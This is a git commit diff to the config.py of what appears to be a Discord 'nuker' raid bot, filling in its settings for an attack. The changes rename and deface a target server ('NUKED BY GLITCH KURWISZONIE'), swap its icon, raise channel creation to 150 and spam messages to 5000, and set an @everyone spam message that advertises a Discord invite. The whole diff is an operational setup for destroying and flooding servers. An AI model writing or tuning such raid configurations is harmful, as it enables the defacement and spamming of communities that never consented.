d189b6d7cc75826ef6f4ad460457fb77abbc8316
JustCaspeR <138797950+JustCaspeRR@users.noreply.github.com>
2026-02-15 02:05:40 +0100

    Update config.py

--- config.py
+++ config.py
@@ -1,33 +1,33 @@
 EMBED_CONFIG = {
-    "title": "",    # Maine Embed Title here 
-    "description": "",   # Main Embed Description here 
+    "title": "NUKED BY GLITCH",    # Maine Embed Title here 
+    "description": "NUKED BY GLITCH https://discord.gg/stRVr4k5",   # Main Embed Description here 
     "color": 0xFF5733,   # Change embed color if you want (red)
     "fields": [
         {"name": "test", "value": "test", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
         {"name": "test", "value": "test", "inline": False},
         {"name": "test","value": "test", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False
     ],
-    "image": "",   # Embed Icon url here → https://image.jpg
-    "footer": "",  # Embed Footer here 
+    "image": "https://cdn.discordapp.com/attachments/1471162330107871315/1472392094768169122/7234-purple-crown.png?ex=6992677f&is=699115ff&hm=7fbd4d7d28b82a43a6746b07d0999567421dc25a4ff77dce7eca363e6682978c&",   # Embed Icon url here → https://image.jpg
+    "footer": "https://cdn.discordapp.com/attachments/1471162330107871315/1472392094768169122/7234-purple-crown.png?ex=6992677f&is=699115ff&hm=7fbd4d7d28b82a43a6746b07d0999567421dc25a4ff77dce7eca363e6682978c&",  # Embed Footer here 
 }
 
 SERVER_CONFIG = {
-    "new_name": "",  # New Server Name here 
-    "new_icon": "",   # New Server Icon url here → https://image.jpg 
-    "new_description": "",  # New Server Description here 
+    "new_name": "NUKED BY GLITCH KURWISZONIE",  # New Server Name here 
+    "new_icon": "https://cdn.discordapp.com/attachments/1471162330107871315/1472392094768169122/7234-purple-crown.png?ex=6992677f&is=699115ff&hm=7fbd4d7d28b82a43a6746b07d0999567421dc25a4ff77dce7eca363e6682978c&",   # New Server Icon url here → https://image.jpg 
+    "new_description": "NUKED BY GLITCH KURWISZONIE",  # New Server Description here 
 }
 
 WEBHOOK_CONFIG = {
-    "default_name": "Nebula",  # Webhook Name here 
+    "default_name": "NUKED BY GLITCH",  # Webhook Name here 
 }
 
 
 AUTO_RAID_CONFIG = {
-    'num_channels': 15,  # Number of channels
+    'num_channels': 150,  # Number of channels
     'channel_type': 'text',  # text/voice
-    'channel_name': '',  # Channel name
-    'num_messages': 5,  # Number of message to spam
-    'message_content': '' # Spam Message
+    'channel_name': 'nuked-by-glitch',  # Channel name
+    'num_messages': 5000,  # Number of message to spam
+    'message_content': '@everyone NUKED BY GLITCH KURWISZONIE https://discord.gg/stRVr4k5' # Spam Message
 }
 
 NO_BAN_KICK_ID = {
@@ -38,5 +38,6 @@ NO_BAN_KICK_ID = {
 
 BOT_PRESENCE = {
     "type": "playing",  # "playing", "listening", or "watching"
-    "text": "Nebula"  # Your text presence
+    "text": "NUKED BY GLITCH"  # Your text presence
 }
+
